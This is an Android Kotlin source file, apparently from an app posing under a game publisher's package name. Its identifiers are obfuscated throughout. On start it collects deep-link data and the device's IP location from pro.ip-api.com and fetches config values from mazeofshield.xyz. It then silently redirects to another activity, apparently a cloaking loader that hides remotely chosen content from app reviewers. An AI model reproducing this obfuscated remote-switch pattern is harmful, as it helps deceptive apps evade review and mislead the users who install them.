package com.socialquantum.acityinta
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import android.content.Context
import com.socialquantum.acityinta.reqws.lxllxock.Riooqqqkkosad
import com.socialquantum.acityinta.vbcb.Deplwlpwlpkosoksd
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import com.socialquantum.acityinta.databinding.ActivityMainBinding
import com.socialquantum.acityinta.reqws.Oywwgysgydw

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job

import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    private lateinit var osokskos: ActivityMainBinding
    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        osokskos = ActivityMainBinding.inflate(layoutInflater)
        setContentView(osokskos.root)

        forokkofkoijcjiv(this)

        val jnxncxjnjnuihfhu = Executors.newSingleThreadScheduledExecutor()
        var epllpsalpdp: String? = Hawk.get(Deplwlpwlpkosoksd.jnxjnjnjncijcjicjid, null)
        var qpqowkooksjidjiuhxhuczhuuhczx: String? = Hawk.get(Deplwlpwlpkosoksd.hhvuicii, null)
        jnxncxjnjnuihfhu.scheduleAtFixedRate({
            if (epllpsalpdp != null && qpqowkooksjidjiuhxhuczhuuhczx != null) {
                jnxncxjnjnuihfhu.shutdown()
                rokrkokodkoo()
            } else {
                epllpsalpdp = Hawk.get(Deplwlpwlpkosoksd.jnxjnjnjncijcjicjid)
                qpqowkooksjidjiuhxhuczhuuhczx = Hawk.get(Deplwlpwlpkosoksd.hhvuicii)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch (Dispatchers.IO){
            ioijcxjijixjiko
        }
    }

    fun forokkofkoijcjiv(plpqlpqlp: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            plpqlpqlp
        ) { bxhzbhcxbh: AppLinkData? ->
            bxhzbhcxbh?.let {
                val opkwkowok = bxhzbhcxbh.targetUri?.host.toString()
                Hawk.put(Deplwlpwlpkosoksd.dokkoepwlplplpsalpdok, opkwkowok)
            }
        }
    }

    private fun rokrkokodkoo() {
        val kxkcmkxmkzkmkmzxjis = Intent(this@MainActivity, Oywwgysgydw::class.java)
        startActivity(kxkcmkxmkzkmkmzxjis)
        finish()
    }
    private val ioijcxjijixjiko: Job = GlobalScope.launch (Dispatchers.IO){
        eowlppwlplplpaspldslpad()
        hxhjxjncjn()
    }


    private suspend fun eowlppwlplplpaspldslpad() {
        val jxjcnjnhus = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(Riooqqqkkosad::class.java)
        val okcoxzokockx = jxjcnjnhus.wpqppqpqp().body()?.eopwowoksppsdlplpds

        Hawk.put(Deplwlpwlpkosoksd.jnxjnjnjncijcjicjid, okcoxzokockx)
    }



    private suspend fun hxhjxjncjn() {
        val owowpwlsppdpl = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://mazeofshield.xyz/")
            .build()
            .create(Riooqqqkkosad::class.java)
        val hxbcbhxbhsjii = owowpwlsppdpl.gfcopopopopoxvok().body()?.kkxkmxmkmkzmkzciijshud.toString()
        val wplwlpelpokskodijxjic = owowpwlsppdpl.gfcopopopopoxvok().body()?.wopwowpllwlpwlplspld.toString()
        val soppwlslpplsd = owowpwlsppdpl.gfcopopopopoxvok().body()?.ijsjid.toString()


        Hawk.put(Deplwlpwlpkosoksd.ycoxkkkojijichuvhuv, hxbcbhxbhsjii)
        Hawk.put(Deplwlpwlpkosoksd.ggcggxhh, wplwlpelpokskodijxjic)
        Hawk.put(Deplwlpwlpkosoksd.hhvuicii, soppwlslpplsd)

    }
}